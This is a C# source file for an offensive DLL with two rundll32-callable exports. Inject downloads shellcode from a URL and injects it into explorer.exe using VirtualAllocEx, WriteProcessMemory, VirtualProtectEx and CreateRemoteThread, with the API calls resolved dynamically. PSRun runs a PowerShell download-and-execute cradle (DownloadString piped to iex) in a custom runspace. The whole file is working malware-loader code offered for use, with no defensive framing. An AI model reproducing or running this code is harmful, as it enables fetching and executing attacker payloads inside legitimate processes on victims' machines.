// Simple CSharp based DLL that can inject in remote process or spawn a powershell download cradle in a custom runspace
// It depends on the DllExport nugget
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;



namespace CS_Tester
{
    public class Class1
    {
        private enum mem : uint
        {
            rwx = 0x40, 
            rw = 0x04, 
            rx = 0x20,   
            cmt_rv = 0x3000,
            proc_all = 0x001F0FFF
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string lib_name);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr lib_handle, string func_name);

        // Delegates
        private delegate IntPtr OP(uint access, bool inherit, uint pid);
        private delegate IntPtr VAE(IntPtr proc_hand, IntPtr addr, uint size, uint aloc, uint prot);
        private delegate bool VPE(IntPtr proc_hand, IntPtr addr, int size, uint aloc, out uint prot);
        private delegate IntPtr CRT(IntPtr proc_hand, IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, out IntPtr ID);
        private delegate bool WPM(IntPtr proc_hand, IntPtr addr, byte[] source, uint size, out uint written);

        private static OP Opener { get; set; }
        private static VAE Allocate { get; set; }
        private static VPE Protect { get; set; }
        private static CRT Threader { get; set; }
        private static WPM Writer { get; set; }

        private static byte[] Fetch(string addr)
        {
            WebClient client = new WebClient();
            byte[] sc = client.DownloadData(addr);
            return sc;
        }

        // Process Injection
        [DllExport]
        public static void Inject(IntPtr hwnd, IntPtr hinst, [MarshalAs(UnmanagedType.LPStr)] string lpszCmdLine, int nCmdShow)
        {
            IntPtr hModule = LoadLibraryA("kernel32.dll");
            Opener = (OP)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "OpenProcess"), typeof(OP));
            Allocate = (VAE)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "VirtualAllocEx"), typeof(VAE));
            Protect = (VPE)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "VirtualProtectEx"), typeof(VPE));
            Threader = (CRT)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "CreateRemoteThread"), typeof(CRT));
            Writer = (WPM)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, "WriteProcessMemory"), typeof(WPM));

            string proc_name = "explorer";

            uint target_id = 0;
            Process[] procs = Process.GetProcessesByName(proc_name);
            foreach (Process proc in procs)
            {
                target_id = (uint)proc.Id;
            }

            byte[] sc = Fetch(lpszCmdLine);

            IntPtr proc_hand = Opener((uint)mem.proc_all, false, target_id);
            IntPtr mem_addr = Allocate(proc_hand, IntPtr.Zero, (uint)sc.Length, (uint)mem.cmt_rv, (uint)mem.rw);

            uint written = 0;
            uint old_protect = 0;
            Writer(proc_hand, mem_addr, sc, (uint)sc.Length, out written);
            Protect(proc_hand, mem_addr, sc.Length, (uint)mem.rx, out old_protect);

            IntPtr pid;
            IntPtr handle = Threader(proc_hand, IntPtr.Zero, 0, mem_addr, IntPtr.Zero, 0, out pid);
        }


        // Run powershell
        [DllExport]
        public static void PSRun(IntPtr hwnd, IntPtr hinst, [MarshalAs(UnmanagedType.LPStr)] string lpszCmdLine, int nCmdShow) 
        {
            Runspace runner = RunspaceFactory.CreateRunspace();
            runner.Open();

            PowerShell psh = PowerShell.Create();
            String to_exec = $"(New-Object System.Net.WebClient).DownloadString('{lpszCmdLine}')|iex";

            psh.AddScript(to_exec);
            psh.Invoke();
            runner.Close();
        }
    }
}